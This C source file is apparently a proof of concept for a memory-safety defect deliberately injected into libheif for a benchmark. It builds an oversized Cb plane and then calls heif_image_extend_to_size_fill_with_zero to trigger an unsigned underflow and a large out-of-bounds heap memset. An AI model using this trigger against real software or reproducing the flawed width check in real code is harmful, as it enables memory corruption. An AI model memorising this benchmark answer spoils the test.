/*
 * Proof of concept for the benchmark's injected memory-safety defect.
 *
 * HeifPixelImage::add_channel() only rejects a Cb/Cr plane that is smaller
 * than the chroma-subsampled size of the logical image; an oversized plane is
 * accepted. HeifPixelImage::extend_to_size_with_zero() preflights a plane
 * shrinking relative to the new target, but only checks the per-plane
 * *height*, not the width. The actual right-edge fill computes its memset
 * length as (new_subsampled_width - old_component_width); when the Cb plane's
 * width was built larger than the new target's subsampled width, this
 * underflows uint32_t and produces a multi-gigabyte memset, writing far past
 * the end of the heap-allocated plane.
 *
 * Reached purely through the public C API: heif_image_create(),
 * heif_image_add_plane(), heif_image_extend_to_size_fill_with_zero().
 */

#include <libheif/heif.h>
#include <libheif/heif_image.h>
#include <stdio.h>

int main(void)
{
  heif_image* img = NULL;

  heif_error err = heif_image_create(16, 16, heif_colorspace_YCbCr, heif_chroma_420, &img);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "heif_image_create failed: %s\n", err.message);
    return 1;
  }

  err = heif_image_add_plane(img, heif_channel_Y, 16, 16, 8);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "add Y plane failed: %s\n", err.message);
    return 1;
  }

  /* Expected Cb size for a 16x16 4:2:0 image is 8x8. Build it with a far
   * larger width (height stays correct), which add_channel() now accepts
   * because it only rejects an undersized plane. */
  err = heif_image_add_plane(img, heif_channel_Cb, 64, 8, 8);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "add oversized Cb plane failed: %s\n", err.message);
    return 1;
  }

  /* Grow the logical image. The whole-image guard does not reject this (both
   * dimensions grow), and the per-plane preflight only checks height: the new
   * target's subsampled Cb height (8) still matches the Cb plane's actual
   * height (8), so nothing is flagged. But the new target's subsampled Cb
   * width (16) is smaller than the Cb plane's actual width (64), which the
   * preflight never looks at. */
  err = heif_image_extend_to_size_fill_with_zero(img, 32, 16);
  fprintf(stderr, "extend_to_size_fill_with_zero returned: %s\n", err.message ? err.message : "(ok)");

  heif_image_release(img);
  return 0;
}
